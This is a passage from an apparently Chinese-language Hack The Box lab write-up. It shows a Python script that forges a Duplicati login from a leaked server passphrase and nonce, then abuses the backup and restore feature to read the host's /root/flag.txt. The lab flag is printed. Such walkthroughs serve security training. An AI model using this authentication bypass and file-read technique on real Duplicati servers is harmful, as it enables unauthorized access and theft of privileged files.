server_passphrase = "ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk="

s = requests.Session()

headers = {
    "Referer": f"{base}/login.html",
    "Origin": base,
    "X-Requested-With": "XMLHttpRequest",
}

s.get(f"{base}/login.html")

r = s.post(f"{base}/login.cgi", data={"get-nonce": "1"}, headers=headers)
data = json.loads(r.content.decode("utf-8-sig"))
nonce = data["Nonce"]

print("[+] Nonce:", nonce)

s.cookies.set("session-nonce", nonce, path="/")

noncedpwd = base64.b64encode(
    hashlib.sha256(
        base64.b64decode(nonce) + base64.b64decode(server_passphrase)
    ).digest()
).decode()

print("[+] noncedpwd:", noncedpwd)

r = s.post(
    f"{base}/login.cgi",
    data={"password": noncedpwd},
    headers=headers,
    cookies={"session-nonce": nonce},
)

print("[+] Status:", r.status_code)
print("[+] Response headers:", dict(r.headers))
print("[+] Response text:", repr(r.text))
print("[+] Session cookies:", s.cookies.get_dict())
print("[+] Response cookies:", r.cookies.get_dict())
```

### 获得cookie
> 获得cookie后修改自身cookie
>
> 再次导航后 [http://127.0.0.1:8200/ngax/index.html](http://127.0.0.1:8200/ngax/index.html) ，我们将成功登录！
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# python3 login.py                
[+] Nonce: RZAAyf320htuIehpjIPxCpQmYaQa/PZ9Vqr5x+vve4Y=
[+] noncedpwd: BMPrlxPFip9xi512qNYWN5NySHoB3BRWKzc0X7jF6ys=
[+] Status: 200
[+] Response headers: {'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0', 'Date': 'Wed, 08 Apr 2026 06:44:25 GMT', 'Content-Length': '23', 'Content-Type': 'application/json', 'Server': 'Tiny WebServer', 'Keep-Alive': 'timeout=20, max=400', 'Connection': 'Keep-Alive', 'Set-Cookie': 'xsrf-token=%2B3eQvwJd9HfAN0h4qB41miHyo4NAYqnO3D984j%2BFpEU%3D; expires=Wed, 08 Apr 2026 06:54:25 GMT;path=/; , session-auth=5T_z1emshleY6bNO7Cmvj5IEqTV2QzWJ1P5q_UfjP20; expires=Wed, 08 Apr 2026 07:44:25 GMT;path=/; '}
[+] Response text: '\ufeff{\n  "Status": "OK"\n}'
[+] Session cookies: {'session-nonce': 'RZAAyf320htuIehpjIPxCpQmYaQa/PZ9Vqr5x+vve4Y='}
[+] Response cookies: {}
```

```plain
curl -i http://127.0.0.1:8200/ngax/index.html \
  -H 'Cookie: session-auth=xxxxxxx; xsrf-token=xxxxxxx; session-nonce=xxxxxxx; default-theme=ngax'
```

![](/image/hackthebox-prolabs/Unintended-2.png)

## 用备份和还原时读取旗帜
我们试着添加一个新的备份：

![](/image/hackthebox-prolabs/Unintended-3.png)

![](/image/hackthebox-prolabs/Unintended-4.png)

我们注意到主机的根文件系统挂载在 Duplicati 容器的 `/source` 处，允许我们将主机上的任何文件备份到任意位置：  
让我们把 `/source/root/flag.txt` 备份到 `/source/tmp/flag`：

![](/image/hackthebox-prolabs/Unintended-5.png)

![](/image/hackthebox-prolabs/Unintended-6.png)  
保持预_约_和_选项_的默认设置。  
点击_立即运行_以获取新添加的备份：

![](/image/hackthebox-prolabs/Unintended-7.png)  
备份运行后，我们可以在 WEB 上的 SSH 会话中检查创建的文件，格式如下：

```plain
juan@unintended.vl@web:/tmp/flag$ dir
duplicati-20260408T070215Z.dlist.zip                    duplicati-iaa43c622710947bfbf29f3bb1fc252c3.dindex.zip
duplicati-b634109aacf85475a956bbff4a11cdf19.dblock.zip
```

现在点击 _“恢复文件”..._

![](/image/hackthebox-prolabs/Unintended-8.png)

将文件（标志）恢复为 `/source/tmp/flag`：

![](/image/hackthebox-prolabs/Unintended-9.png)

![](/image/hackthebox-prolabs/Unintended-10.png)

![](/image/hackthebox-prolabs/Unintended-11.png)

恢复后，我们可以读到旗帜：

```plain
juan@unintended.vl@web:/tmp/flag$ ls
duplicati-20260408T070215Z.dlist.zip                    duplicati-iaa43c622710947bfbf29f3bb1fc252c3.dindex.zip
duplicati-b634109aacf85475a956bbff4a11cdf19.dblock.zip  flag.txt
```

```plain
juan@unintended.vl@web:/tmp/flag$ cat flag.txt 
UNINTENDED{c182b2c2fb66201d66355ba4804943ed}
```
